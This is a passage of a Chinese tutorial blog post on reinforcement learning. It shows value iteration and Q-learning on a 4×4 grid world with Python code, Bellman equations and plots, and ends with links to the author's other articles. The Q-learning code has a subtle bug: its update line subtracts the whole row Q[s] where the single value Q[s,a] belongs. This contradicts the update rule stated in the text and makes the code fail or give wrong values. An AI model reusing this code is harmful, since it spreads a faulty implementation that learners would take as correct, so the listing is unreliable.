<span class="hljs-attr">action_symbols</span> = [<span class="hljs-string">'↑'</span>,<span class="hljs-string">'↓'</span>,<span class="hljs-string">'←'</span>,<span class="hljs-string">'→'</span>]

<span class="hljs-attr">start_state</span> = <span class="hljs-number">0</span>
<span class="hljs-attr">terminal_state</span> = n_states-<span class="hljs-number">1</span>
<span class="hljs-attr">reward_step</span> = -<span class="hljs-number">1</span>
<span class="hljs-attr">reward_terminal</span> = <span class="hljs-number">0</span>
<span class="hljs-attr">gamma</span> = <span class="hljs-number">0.9</span>
<span class="hljs-attr">theta</span> = <span class="hljs-number">1</span>e-<span class="hljs-number">4</span>

def next_state_reward(s,a):
    row,<span class="hljs-attr">col</span> = divmod(s,n_cols)
    if <span class="hljs-attr">s</span>==terminal_state:
        return s, reward_terminal
    dr,<span class="hljs-attr">dc</span> = action_<span class="hljs-literal">off</span>sets[a]
    <span class="hljs-attr">new_row</span> = min(max(row+dr,<span class="hljs-number">0</span>),n_rows-<span class="hljs-number">1</span>)
    <span class="hljs-attr">new_col</span> = min(max(col+dc,<span class="hljs-number">0</span>),n_cols-<span class="hljs-number">1</span>)
    <span class="hljs-attr">s_next</span> = new_row*n_cols+new_col
    return s_next, reward_step

<span class="hljs-comment"># 值迭代</span>
<span class="hljs-attr">V</span> = np.zeros(n_states)
while True:
    <span class="hljs-attr">delta</span> = <span class="hljs-number">0</span>
    for s in range(n_states):
        if <span class="hljs-attr">s</span>==terminal_state:
            continue
        <span class="hljs-attr">v</span> = V[s]
        V<span class="hljs-section">[s]</span> = max(<span class="hljs-section">[next_state_reward(s,a)[1]</span>+gamma*V<span class="hljs-section">[next_state_reward(s,a)[0]]</span> for a in range(n_actions)])
        <span class="hljs-attr">delta</span> = max(delta, abs(v-V[s]))
    if delta&lt;theta:
        break

<span class="hljs-comment"># 导出最优策略</span>
<span class="hljs-attr">policy</span> = np.full(n_states,<span class="hljs-string">''</span>,dtype=object)
for s in range(n_states):
    if <span class="hljs-attr">s</span>==start_state:
        policy<span class="hljs-section">[s]</span>='S'
    elif <span class="hljs-attr">s</span>==terminal_state:
        policy<span class="hljs-section">[s]</span>='T'
    else:
        <span class="hljs-attr">q_values</span> = [next_state_reward(s,a)[<span class="hljs-number">1</span>]+gamma*V[next_state_reward(s,a)[<span class="hljs-number">0</span>]] for a in range(n_actions)]
        policy<span class="hljs-section">[s]</span>=action_symbols<span class="hljs-section">[np.argmax(q_values)]</span>

<span class="hljs-attr">grid_policy</span> = policy.reshape(n_rows,n_cols)
print("最优策略：")
print(grid_policy)

<span class="hljs-comment"># 可视化值函数和策略</span>
plt.figure(<span class="hljs-attr">figsize</span>=(<span class="hljs-number">6</span>,<span class="hljs-number">6</span>))
plt.imshow(V.reshape(n_rows,n_cols), <span class="hljs-attr">cmap</span>=<span class="hljs-string">'cool'</span>, interpolation=<span class="hljs-string">'nearest'</span>)
for i in range(n_rows):
    for j in range(n_cols):
        plt.text(j,i,f"{V<span class="hljs-section">[i*n_cols+j]</span>:.1f}\n{grid_policy<span class="hljs-section">[i,j]</span>}",<span class="hljs-attr">ha</span>=<span class="hljs-string">'center'</span>,va=<span class="hljs-string">'center'</span>,color=<span class="hljs-string">'black'</span>)
plt.title("Grid World: State Values and Optimal Policy")
plt.colorbar(<span class="hljs-attr">label</span>=<span class="hljs-string">"Value"</span>)
plt.show()
</code></pre>
<p>结果如下，左上角为起点 S，右下角为终点 T。每个格子显示对应的最优动作方向（↑↓←→），智能体能够顺利从起点到达终点，颜色越深表示状态价值越高，显示状态越接近终点的累计收益越大。值迭代通过迭代更新状态价值函数，最终收敛到最优值函数，从而导出全局最优策略。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/410cfb5217a4435c84711fb3694312e3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgYWljb3Rpbmc=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769529615&amp;x-signature=iZ8T70ifKZMk%2FixW9Y9gPoKxNFU%3D" alt="" loading="lazy"/></p>
<p>总结一下就是动态规划提供了求解马尔可夫决策过程的一般框架，而值迭代则是最常用的实现方式之一。通过迭代更新状态价值函数，值迭代能够高效求得最优策略。</p>
<h3 data-id="heading-3">Q-learning</h3>
<p>Q-Learning 是强化学习中最经典的基于值函数的无模型方法（model-free method）之一，用于求解马尔可夫决策过程（MDP）中的最优策略。它不依赖于已知的环境状态转移概率，只需通过智能体与环境的交互经验就能学习最优策略，因此在实际强化学习任务中应用广泛。</p>
<p>Q-Learning 的核心是学习每个状态-动作对的价值函数（Q 函数）：</p>
<p>在状态下选择动作的期望累积回报<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>Q</mi><mo stretchy="false">(</mo><mi>s</mi><mo separator="true">,</mo><mi>a</mi><mo stretchy="false">)</mo><mo>=</mo><mtext>在状态 </mtext><mi>s</mi><mtext>下选择动作 </mtext><mi>a</mi><mtext>的期望累积回报</mtext></mrow><annotation encoding="application/x-tex">Q(s,a)=在状态 s下选择动作 a的期望累积回报</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord mathnormal">Q</span><span class="mopen">(</span><span class="mord mathnormal">s</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord mathnormal">a</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord cjk_fallback">在状态</span><span class="mord"> </span><span class="mord mathnormal">s</span><span class="mord cjk_fallback">下选择动作</span><span class="mord"> </span><span class="mord mathnormal">a</span><span class="mord cjk_fallback">的期望累积回报</span></span></span></span></span></p>
<p>最优 Q 函数满足贝尔曼最优方程：</p>
<p><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>Q</mi><mo>∗</mo></msup><mo stretchy="false">(</mo><mi>s</mi><mo separator="true">,</mo><mi>a</mi><mo stretchy="false">)</mo><mo>=</mo><mi mathvariant="double-struck">E</mi><mo fence="false" stretchy="true" minsize="1.2em" maxsize="1.2em">[</mo><msub><mi>R</mi><mrow><mi>t</mi><mo>+</mo><mn>1</mn></mrow></msub><mo>+</mo><mi>γ</mi><msub><mrow><mi>max</mi><mo>⁡</mo></mrow><msup><mi>a</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup></msub><msup><mi>Q</mi><mo>∗</mo></msup><mo stretchy="false">(</mo><msub><mi>s</mi><mrow><mi>t</mi><mo>+</mo><mn>1</mn></mrow></msub><mo separator="true">,</mo><msup><mi>a</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mo stretchy="false">)</mo><mtext> </mtext><mi mathvariant="normal">∣</mi><mtext> </mtext><msub><mi>s</mi><mi>t</mi></msub><mo>=</mo><mi>s</mi><mo separator="true">,</mo><msub><mi>a</mi><mi>t</mi></msub><mo>=</mo><mi>a</mi><mo fence="false" stretchy="true" minsize="1.2em" maxsize="1.2em">]</mo></mrow><annotation encoding="application/x-tex">Q^*(s,a) = \mathbb{E}\big[ R_{t+1} + \gamma \max_{a'} Q^*(s_{t+1},a') \,|\, s_t=s, a_t=a \big]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord"><span class="mord mathnormal">Q</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6887em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mbin mtight">∗</span></span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">s</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord mathnormal">a</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:1.2em;vertical-align:-0.35em;"/><span class="mord mathbb">E</span><span class="mord"><span class="delimsizing size1">[</span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0077em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">t</span><span class="mbin mtight">+</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2083em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:1.0019em;vertical-align:-0.25em;"/><span class="mord mathnormal" style="margin-right:0.05556em;">γ</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mop"><span class="mop">max</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.328em;"><span style="top:-2.55em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">a</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6828em;"><span style="top:-2.786em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"/><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord"><span class="mord mathnormal">Q</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6887em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mbin mtight">∗</span></span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">t</span><span class="mbin mtight">+</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2083em;"><span/></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7519em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord">∣</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2806em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">t</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"/><span class="mord mathnormal">s</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2806em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">t</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:1.2em;vertical-align:-0.35em;"/><span class="mord mathnormal">a</span><span class="mord"><span class="delimsizing size1">]</span></span></span></span></span></span></p>
<p>其中：</p>
<ul>
<li><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi></mrow><annotation encoding="application/x-tex">s</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"/><span class="mord mathnormal">s</span></span></span></span></span>为当前状态</li>
<li><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi></mrow><annotation encoding="application/x-tex">a</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"/><span class="mord mathnormal">a</span></span></span></span></span>为当前动作</li>
<li><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi><mtext>′</mtext></mrow><annotation encoding="application/x-tex">s′</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5556em;"/><span class="mord mathnormal">s</span><span class="mord">′</span></span></span></span></span>为下一个状态</li>
<li><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>R</mi><mrow><mi>t</mi><mo>+</mo><mn>1</mn></mrow></msub></mrow><annotation encoding="application/x-tex">R_{t+1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8917em;vertical-align:-0.2083em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0077em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">t</span><span class="mbin mtight">+</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2083em;"><span/></span></span></span></span></span></span></span></span></span>为即时奖励</li>
<li><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>γ</mi></mrow><annotation encoding="application/x-tex">γ</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"/><span class="mord mathnormal" style="margin-right:0.05556em;">γ</span></span></span></span></span>为折扣因子</li>
</ul>
<p>通过不断更新 Q 值，Q-Learning 能收敛到最优 Q 函数 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>Q</mi><mo>∗</mo></msup></mrow><annotation encoding="application/x-tex">Q^*</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8831em;vertical-align:-0.1944em;"/><span class="mord"><span class="mord mathnormal">Q</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6887em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mbin mtight">∗</span></span></span></span></span></span></span></span></span></span></span></span>，从而导出最优策略：</p>
<p><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>π</mi><mo>∗</mo></msup><mo stretchy="false">(</mo><mi>s</mi><mo stretchy="false">)</mo><mo>=</mo><mi>arg</mi><mo>⁡</mo><msub><mrow><mi>max</mi><mo>⁡</mo></mrow><mi>a</mi></msub><msup><mi>Q</mi><mo>∗</mo></msup><mo stretchy="false">(</mo><mi>s</mi><mo separator="true">,</mo><mi>a</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\pi^*(s) = \arg\max_a Q^*(s,a)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">π</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6887em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mbin mtight">∗</span></span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">s</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mop">ar<span style="margin-right:0.01389em;">g</span></span><span class="mspace" style="margin-right:0.1667em;"/><span class="mop"><span class="mop">max</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">a</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord"><span class="mord mathnormal">Q</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6887em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mbin mtight">∗</span></span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">s</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord mathnormal">a</span><span class="mclose">)</span></span></span></span></span></p>
<p>Q-Learning 算法的步骤如下：</p>
<ol>
<li>初始化：对每个状态-动作对<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>Q</mi><mo stretchy="false">(</mo><mi>s</mi><mo separator="true">,</mo><mi>a</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">Q(s,a)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord mathnormal">Q</span><span class="mopen">(</span><span class="mord mathnormal">s</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord mathnormal">a</span><span class="mclose">)</span></span></span></span></span>初始化为 0 或小随机数。</li>
<li>交互学习：在每个时间步 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>t</mi></mrow><annotation encoding="application/x-tex">t</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6151em;"/><span class="mord mathnormal">t</span></span></span></span></span>，智能体从状态 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi></mrow><annotation encoding="application/x-tex">s</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"/><span class="mord mathnormal">s</span></span></span></span></span> 选择动作 a（通常采用 ϵ-贪心策略）。</li>
<li>执行动作：智能体执行动作 a，观察奖励Rt+1 和下一个状态 s’。</li>
<li>更新 Q 值： Q(s,a)←Q(s,a)+α[Rt+1+γmaxa′Q(s′,a′)−Q(s,a)]其中 α为学习率。</li>
<li>迭代直到收敛：重复步骤 2-4，直至 Q 值收敛或达到最大迭代次数。</li>
</ol>
<p>下面我们通过 4×4 网格世界演示 Q-Learning 学习最优策略，</p>
<pre><code class="hljs language-ini" lang="ini">import numpy as np
import matplotlib.pyplot as plt

<span class="hljs-comment"># 网格世界参数</span>
n_rows, <span class="hljs-attr">n_cols</span> = <span class="hljs-number">4</span>, <span class="hljs-number">4</span>
<span class="hljs-attr">n_states</span> = n_rows * n_cols
<span class="hljs-attr">n_actions</span> = <span class="hljs-number">4</span>  <span class="hljs-comment"># 上,下,左,右</span>
<span class="hljs-attr">action_offsets</span> = [(-<span class="hljs-number">1</span>,<span class="hljs-number">0</span>),(<span class="hljs-number">1</span>,<span class="hljs-number">0</span>),(<span class="hljs-number">0</span>,-<span class="hljs-number">1</span>),(<span class="hljs-number">0</span>,<span class="hljs-number">1</span>)]
<span class="hljs-attr">action_symbols</span> = [<span class="hljs-string">'↑'</span>,<span class="hljs-string">'↓'</span>,<span class="hljs-string">'←'</span>,<span class="hljs-string">'→'</span>]

<span class="hljs-attr">start_state</span> = <span class="hljs-number">0</span>
<span class="hljs-attr">terminal_state</span> = n_states-<span class="hljs-number">1</span>
<span class="hljs-attr">reward_step</span> = -<span class="hljs-number">1</span>
<span class="hljs-attr">reward_terminal</span> = <span class="hljs-number">0</span>

<span class="hljs-attr">gamma</span> = <span class="hljs-number">0.9</span>
<span class="hljs-attr">alpha</span> = <span class="hljs-number">0.1</span>
<span class="hljs-attr">epsilon</span> = <span class="hljs-number">0.1</span>
<span class="hljs-attr">n_episodes</span> = <span class="hljs-number">5000</span>

<span class="hljs-comment"># 状态转移</span>
def next_state_reward(s,a):
    row,<span class="hljs-attr">col</span> = divmod(s,n_cols)
    if <span class="hljs-attr">s</span>==terminal_state:
        return s,reward_terminal
    dr,<span class="hljs-attr">dc</span> = action_<span class="hljs-literal">off</span>sets[a]
    <span class="hljs-attr">new_row</span> = min(max(row+dr,<span class="hljs-number">0</span>),n_rows-<span class="hljs-number">1</span>)
    <span class="hljs-attr">new_col</span> = min(max(col+dc,<span class="hljs-number">0</span>),n_cols-<span class="hljs-number">1</span>)
    <span class="hljs-attr">s_next</span> = new_row*n_cols+new_col
    return s_next,reward_step

<span class="hljs-comment"># 初始化 Q 表</span>
<span class="hljs-attr">Q</span> = np.zeros((n_states,n_actions))

<span class="hljs-comment"># Q-Learning 主循环</span>
for episode in range(n_episodes):
    <span class="hljs-attr">s</span> = start_state
    while s != terminal_state:
        <span class="hljs-comment"># epsilon-greedy 选择动作</span>
        if np.random.rand() &lt; epsilon:
            <span class="hljs-attr">a</span> = np.random.randint(n_actions)
        else:
            <span class="hljs-attr">a</span> = np.argmax(Q[s])
        s_next, <span class="hljs-attr">r</span> = next_state_reward(s,a)
        Q<span class="hljs-section">[s,a]</span> += alpha*(r + gamma*np.max(Q<span class="hljs-section">[s_next]</span>) - Q<span class="hljs-section">[s]</span>)
        <span class="hljs-attr">s</span> = s_next

<span class="hljs-comment"># 导出最优策略</span>
<span class="hljs-attr">policy</span> = np.full(n_states,<span class="hljs-string">''</span>,dtype=object)
for s in range(n_states):
    if <span class="hljs-attr">s</span>==start_state:
        policy<span class="hljs-section">[s]</span>='S'
    elif <span class="hljs-attr">s</span>==terminal_state:
        policy<span class="hljs-section">[s]</span>='T'
    else:
        policy<span class="hljs-section">[s]</span> = action_symbols<span class="hljs-section">[np.argmax(Q[s]</span>)]

<span class="hljs-attr">grid_policy</span> = policy.reshape(n_rows,n_cols)
print("最优策略：")
print(grid_policy)

<span class="hljs-comment"># 可视化</span>
plt.figure(<span class="hljs-attr">figsize</span>=(<span class="hljs-number">6</span>,<span class="hljs-number">6</span>))
plt.imshow(np.max(Q,<span class="hljs-attr">axis</span>=<span class="hljs-number">1</span>).reshape(n_rows,n_cols), cmap=<span class="hljs-string">'cool'</span>, interpolation=<span class="hljs-string">'nearest'</span>)
for i in range(n_rows):
    for j in range(n_cols):
        plt.text(j,i,f"{grid_policy<span class="hljs-section">[i*n_cols+j]</span>}",<span class="hljs-attr">ha</span>=<span class="hljs-string">'center'</span>,va=<span class="hljs-string">'center'</span>,color=<span class="hljs-string">'black'</span>)
plt.title("Grid World: Optimal Policy via Q-Learning")
plt.colorbar(<span class="hljs-attr">label</span>=<span class="hljs-string">"Max Q-Value"</span>)
plt.show()
</code></pre>
<p>结果如下图，同样，起点 S 到终点 T 的路径由策略指示，方向箭头指明智能体应该采取的动作，颜色深表示该状态下最大 Q 值较高，说明靠近终点或通往终点的动作更优。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c83f93ead29a4d9b855fedd264ffa756~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgYWljb3Rpbmc=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769529615&amp;x-signature=hCGl0yc4lLPO%2BIANO%2FPTb4qTUXk%3D" alt="" loading="lazy"/></p>
<p>添加图片注释，不超过 140 字（可选）</p>
<p>简单总结一下，Q-Learning 是强化学习中基础而重要的算法，通过不断更新状态-动作价值函数，智能体可以在未知环境中学习最优策略。其优点是无模型、简单易实现、收敛性良好，缺点是状态空间和动作空间过大时需要采用函数逼近（如深度 Q 网络）。</p>
<p>最新的文章都在公众号aicoting更新，别忘记关注哦！！！</p>
<p>📚 推荐阅读</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMzkwMTcyOTcyOQ%3D%3D%26mid%3D2247485782%26idx%3D1%26sn%3D060c8222b47cbf903fbfded1f0421bcf%26scene%3D21%23wechat_redirect" target="_blank" title="https://mp.weixin.qq.com/s?__biz=MzkwMTcyOTcyOQ==&amp;mid=2247485782&amp;idx=1&amp;sn=060c8222b47cbf903fbfded1f0421bcf&amp;scene=21#wechat_redirect" ref="nofollow noopener noreferrer">机器学习之数据预处理篇！</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMzkwMTcyOTcyOQ%3D%3D%26mid%3D2247485800%26idx%3D1%26sn%3Da52107c9dc7071d8530a24563861fa46%26scene%3D21%23wechat_redirect" target="_blank" title="https://mp.weixin.qq.com/s?__biz=MzkwMTcyOTcyOQ==&amp;mid=2247485800&amp;idx=1&amp;sn=a52107c9dc7071d8530a24563861fa46&amp;scene=21#wechat_redirect" ref="nofollow noopener noreferrer">机器学习特征工程中的特征选择</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMzkwMTcyOTcyOQ%3D%3D%26mid%3D2247485808%26idx%3D1%26sn%3D2c57081d4b12433f6b8919209e2e52ed%26scene%3D21%23wechat_redirect" target="_blank" title="https://mp.weixin.qq.com/s?__biz=MzkwMTcyOTcyOQ==&amp;mid=2247485808&amp;idx=1&amp;sn=2c57081d4b12433f6b8919209e2e52ed&amp;scene=21#wechat_redirect" ref="nofollow noopener noreferrer">机器学习中的特征构造</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMzkwMTcyOTcyOQ%3D%3D%26mid%3D2247485820%26idx%3D1%26sn%3Dadcb41fd14347f2f1431709323fa253f%26scene%3D21%23wechat_redirect" target="_blank" title="https://mp.weixin.qq.com/s?__biz=MzkwMTcyOTcyOQ==&amp;mid=2247485820&amp;idx=1&amp;sn=adcb41fd14347f2f1431709323fa253f&amp;scene=21#wechat_redirect" ref="nofollow noopener noreferrer">机器学习之特征降维</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMzkwMTcyOTcyOQ%3D%3D%26mid%3D2247485941%26idx%3D1%26sn%3Dcb53a98bacd1cfbd3255bbeeab6a24ec%26scene%3D21%23wechat_redirect" target="_blank" title="https://mp.weixin.qq.com/s?__biz=MzkwMTcyOTcyOQ==&amp;mid=2247485941&amp;idx=1&amp;sn=cb53a98bacd1cfbd3255bbeeab6a24ec&amp;scene=21#wechat_redirect" ref="nofollow noopener noreferrer">一文搞懂层次聚类和密度聚类方法！</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMzkwMTcyOTcyOQ%3D%3D%26mid%3D2247485946%26idx%3D1%26sn%3Da5cf50a4a3bda9785fb0c7baae3a6bb2%26scene%3D21%23wechat_redirect" target="_blank" title="https://mp.weixin.qq.com/s?__biz=MzkwMTcyOTcyOQ==&amp;mid=2247485946&amp;idx=1&amp;sn=a5cf50a4a3bda9785fb0c7baae3a6bb2&amp;scene=21#wechat_redirect" ref="nofollow noopener noreferrer">一文搞懂机器学习中的PCA主成分分析！</a></p>
